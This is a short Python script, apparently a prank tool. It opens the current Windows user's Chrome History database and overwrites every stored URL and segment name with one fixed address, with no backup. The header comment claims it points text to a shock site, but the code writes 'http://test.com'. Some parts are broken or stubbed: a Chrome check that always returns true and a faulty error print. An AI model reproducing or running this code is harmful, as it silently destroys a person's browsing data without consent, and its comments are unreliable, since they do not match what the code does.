#Program: If chrome is installed gets user profile and changes chromes
# predictors file to point all text to LemonParty.org
# Python 3.X Windows
#By INIT_6
#TODO Make backup of history file.
#TODO add linux support

import sqlite3 as lite
import sys
import getpass

def main():
    if hasChrome() == True:
        profileName = getProfileName()
        databaseFile = getDatabase()
        query = 'SELECT * FROM urls'
        con = None
        url = "http://test.com"
        try:
            
            con = lite.connect(databaseFile)

            cur = con.cursor()
            cur.execute(query)

            rows = cur.fetchall()
            for row in rows:
                #print ( row[0] )
                cur.execute('UPDATE urls SET url=? WHERE id=?', (url, row[0]))
                cur.execute('UPDATE segments SET name=? WHERE url_id=?', (url, row[0]))
                
            con.commit()

        except lite.Error as e:

            print ("Error %s:") % e.args[0]
            sys.exit(1)

        finally:

            if con:
                con.close()
                
def hasChrome():
    #check to see if chrome is installed.
    return True

def getProfileName():
    return getpass.getuser()

def getDatabase():
    #check windows install dir, check chrome install dir. build path and return.
    path = 'C:\\users\\' + getProfileName() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
    return path
    
main()

    
